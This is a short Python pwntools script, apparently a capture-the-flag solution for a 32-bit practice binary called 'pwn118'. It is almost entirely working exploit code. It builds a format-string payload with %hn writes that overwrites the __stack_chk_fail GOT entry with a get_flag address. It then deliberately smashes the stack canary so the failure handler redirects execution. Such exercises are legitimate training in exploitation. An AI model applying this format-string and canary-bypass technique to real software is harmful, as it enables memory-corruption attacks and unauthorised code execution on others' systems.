from pwn import *
import os
from pathlib import Path
context.arch = "i386"
context.log_level = "info"
GET_FLAG           = 0x08048586
GOT_STACK_CHK_FAIL = 0x08049118
pwn = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pwn118")
pwn_root = Path(__file__).resolve().parents[3]
loader = pwn_root / "libc/2.23/i386/ld-linux.so.2"
libdir = pwn_root / "libc/2.23/i386/lib"
# get_flag=0x08048586 → 写 0x0804→GOT+2(%7$hn), 0x8586→GOT(%8$hn)
fmt  = p32(GOT_STACK_CHK_FAIL + 2)
fmt += p32(GOT_STACK_CHK_FAIL)
fmt += f"%{0x0804 - 8}c%7$hn".encode()
fmt += f"%{0x8586 - 0x0804}c%8$hn".encode()
fmt += b"\x00"
fmt += b"A" * (80 - len(fmt))   # pad to canary offset
fmt += b"BBBB"                   # corrupt canary → __stack_chk_fail → get_flag
p = process([str(loader), "--library-path", str(libdir), pwn])
p.send(fmt)
print(p.recvall(timeout=5).decode(errors="replace"))
